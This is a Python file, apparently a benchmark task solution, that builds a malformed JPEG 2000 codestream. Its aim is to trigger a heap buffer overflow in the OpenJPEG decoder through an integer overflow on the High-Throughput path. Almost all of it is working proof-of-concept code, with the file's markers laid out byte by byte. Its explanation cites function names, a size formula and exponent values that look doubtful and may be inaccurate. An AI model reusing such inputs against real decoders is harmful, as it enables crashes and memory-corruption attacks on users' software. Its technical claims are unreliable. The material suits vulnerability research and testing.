import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        The vulnerability is a heap buffer overflow in opj_t1_allocate_buffers,
        triggered via the High-Throughput (HT) decoding path. The size for a
        malloc call is calculated based on code-block dimensions (w, h), and
        an integer overflow can occur in the `w * h` multiplication if the
        dimensions are large enough. This results in a much smaller buffer
        being allocated than required, leading to a heap overflow when the
        decoder attempts to write the full amount of data.

        The vulnerable calculation for code-block dimensions in the HT path is
        located in `opj_tcd_init_cblks_from_ht`. The dimensions `w` and `h`
        are both set to a value derived from the code-block width and height
        exponents specified in the COD marker segment:
        `size = 1U << (cblkw_exp + cblkh_exp - 8)`.

        To trigger a 32-bit integer overflow, `size * size` must be at least 2^32.
        This requires `size` to be at least 2^16 (65536). Therefore, the exponent
        in the calculation must be at least 16:
        `cblkw_exp + cblkh_exp - 8 >= 16`
        `cblkw_exp + cblkh_exp >= 24`

        We can choose `cblkw_exp = 12` and `cblkh_exp = 12`. These values are
        set in the `SPcod` field of the `COD` marker. The HT path is enabled by
        setting the `0x20` flag in the `cblksty` field of `SPcod`.

        The PoC is a minimal J2K codestream with the necessary markers (SOC,
        SIZ, COD, SOT, SOD) to reach the vulnerable code path. The crash occurs
        during buffer allocation before tile data is actually processed, so
        the data stream after the SOD marker can be empty.
        """
        poc = b''
        
        # SOC - Start of Codestream marker
        poc += b'\xff\x4f'

        # SIZ - Image and Tile Size marker
        poc += b'\xff\x51'
        # Lsiz: Marker length (38 base + 3 per component)
        poc += struct.pack('>H', 38 + 1 * 3)
        # Rsiz: Capabilities (0 for baseline)
        poc += struct.pack('>H', 0)
        # Image dimensions (e.g., 256x256)
        poc += struct.pack('>I', 256)         # Xsiz
        poc += struct.pack('>I', 256)         # Ysiz
        # Image offsets (0,0)
        poc += struct.pack('>I', 0)           # XOsiz
        poc += struct.pack('>I', 0)           # YOsiz
        # Tile dimensions (one tile covering the whole image)
        poc += struct.pack('>I', 256)         # XTsiz
        poc += struct.pack('>I', 256)         # YTsiz
        # Tile offsets (0,0)
        poc += struct.pack('>I', 0)           # XTOsiz
        poc += struct.pack('>I', 0)           # YTOsiz
        # Csiz: Number of components
        poc += struct.pack('>H', 1)
        # Component 0 info: 8-bit unsigned, no subsampling
        poc += struct.pack('>B', 7)           # Ssiz
        poc += struct.pack('>B', 1)           # XRsiz
        poc += struct.pack('>B', 1)           # YRsiz

        # COD - Coding Style Default marker
        poc += b'\xff\x52'
        # Lcod: Marker length (12 bytes)
        poc += struct.pack('>H', 12)
        # Scod: Coding style (no precincts)
        poc += struct.pack('>B', 0)
        # SGcod: Progression order, layers, MCT
        poc += struct.pack('>B', 0)           # Progression order (LRCP)
        poc += struct.pack('>H', 1)           # Number of layers
        poc += struct.pack('>B', 0)           # Multiple component transform
        # SPcod: Coding style parameters
        poc += struct.pack('>B', 5)           # Number of decomposition levels
        # Set code-block dimension exponents to trigger overflow
        poc += struct.pack('>B', 12)          # cblkw exponent
        poc += struct.pack('>B', 12)          # cblkh exponent
        # Enable High-Throughput (HT) mode
        poc += struct.pack('>B', 0x20)        # cblksty (HT flag)
        # Wavelet transform (5-3 reversible)
        poc += struct.pack('>B', 1)

        # SOT - Start of Tile-part marker
        poc += b'\xff\x90'
        # Lsot: Marker length (10 bytes)
        poc += struct.pack('>H', 10)
        # Isot: Tile index
        poc += struct.pack('>H', 0)
        # Psot: Length of tile-part (0 means until next SOT or EOC)
        poc += struct.pack('>I', 0)
        # TPsot: Tile-part index
        poc += struct.pack('>B', 0)
        # TNsot: Number of tile-parts for this tile
        poc += struct.pack('>B', 1)

        # SOD - Start of Data marker
        poc += b'\xff\x93'

        return poc
